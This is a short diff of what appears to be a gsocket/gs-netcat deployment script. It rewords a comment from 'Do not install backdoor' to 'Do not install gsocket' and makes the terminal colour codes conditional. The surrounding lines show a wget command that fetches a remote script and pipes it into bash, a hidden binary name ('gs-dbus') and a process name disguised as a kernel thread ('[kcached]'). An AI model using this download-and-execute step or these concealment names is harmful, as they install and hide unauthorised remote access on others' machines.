@@ -34,7 +34,7 @@
 # GS_NOSTART=1
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
-#		- Do not install backdoor
+#		- Do not install gsocket
 # GS_OSARCH=x86_64-alpine
 #       - Force architecutre to a specific package (for testing purpose only)
 # GS_PREFIX=path
@@ -59,14 +59,16 @@ DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 BIN_HIDDEN_NAME_DEFAULT=gs-dbus
 # Can not use '[kcached/0]'. Bash without bashrc would use "/0] $" as prompt. 
 PROC_HIDDEN_NAME_DEFAULT="[kcached]"
-CY="\033[1;33m" # yellow
-CG="\033[1;32m" # green
-CR="\033[1;31m" # red
-CDR="\033[0;31m" # red
-CC="\033[1;36m" # cyan
-CM="\033[1;35m" # magenta
-CN="\033[0m"    # none
-CW="\033[1;37m"
+[[ -t 1 ]] && {
+	CY="\033[1;33m" # yellow
+	CG="\033[1;32m" # green
+	CR="\033[1;31m" # red
+	CDR="\033[0;31m" # red
+	CC="\033[1;36m" # cyan
+	CM="\033[1;35m" # magenta
+	CN="\033[0m"    # none
+	CW="\033[1;37m"
+}
 
 # arr=()
 # arr+=("-r" "/etc/foobar.txt")
